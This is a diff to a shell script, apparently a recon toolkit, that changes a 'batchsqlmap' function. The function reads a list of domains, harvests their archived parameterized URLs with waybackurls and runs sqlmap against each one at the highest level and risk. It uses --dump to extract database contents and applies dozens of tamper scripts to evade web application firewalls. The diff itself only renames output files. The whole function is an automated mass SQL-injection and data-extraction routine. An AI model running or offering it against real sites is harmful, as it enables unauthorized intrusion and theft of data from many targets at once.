@@ -430,14 +430,14 @@ nmap2(){
 batchsqlmap(){
 	for dom in `cat $1`; do 
 		now=$(date +"%Y%m%d%H%M")
-		echo $dom | waybackurls | grep -E "\?" | sort -u -o lista$now.txt
-		if [[ -f lista$now.txt && ! -s lista$now.txt ]]; then
+		echo $dom | waybackurls | grep -E "\?" | sort -u -o lista$dom$now.txt
+		if [[ -f lista$dom$now.txt && ! -s lista$dom$now.txt ]]; then
 			continue
 		fi
-		for i in `cat lista$now.txt`; do 
+		for i in `cat lista$dom$now.txt`; do 
 			python3 ~/tools/sqlmap-dev/sqlmap.py -u $i --level=5 --risk=3 --threads=10 --answers="follow=Y" --batch --dump --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords ; 
-		done > ~/tools/recon/sqlmap$now.txt
-		rm lista$now.txt
+		done > ~/tools/recon/sqlmap$dom$now.txt
+		rm lista$dom$now.txt
 	done
 }
 
